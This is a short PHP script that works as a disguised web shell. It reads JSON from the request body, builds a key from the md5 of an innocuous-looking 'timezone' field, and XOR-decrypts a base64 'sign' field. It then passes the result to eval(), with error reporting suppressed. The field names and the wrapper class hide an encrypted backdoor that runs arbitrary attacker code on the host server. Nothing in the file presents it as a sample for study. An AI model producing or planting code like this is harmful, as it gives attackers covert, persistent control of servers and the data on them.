<?php
@error_reporting(0);
session_start();

class Handle
{
    public function __construct($p)
    {
        $func = function($code) {
            eval($code);
        };
        call_user_func($func, $p."");
    }
}

$post = file_get_contents("php://input");
if (isset($post)) {
    // Decode JSON input
    $data = json_decode($post, true);

    if (json_last_error() === JSON_ERROR_NONE) {
        $timezone = $data['timezone'] ?? null;
        $sign = $data['sign'] ?? null;
		$key = substr(md5($timezone), 0, 16);
        $_SESSION['k'] = $key;
        
        if ($timezone && $sign) {
            // Base64 decode the sign
            $decodedSign = base64_decode($sign);

            // XOR decryption
            for ($i = 0; $i < strlen($decodedSign); $i++) {
                $decodedSign[$i] = $decodedSign[$i] ^ $key[$i + 1 & 15];
            }

            @new Handle($decodedSign);
        }
    }
}
?>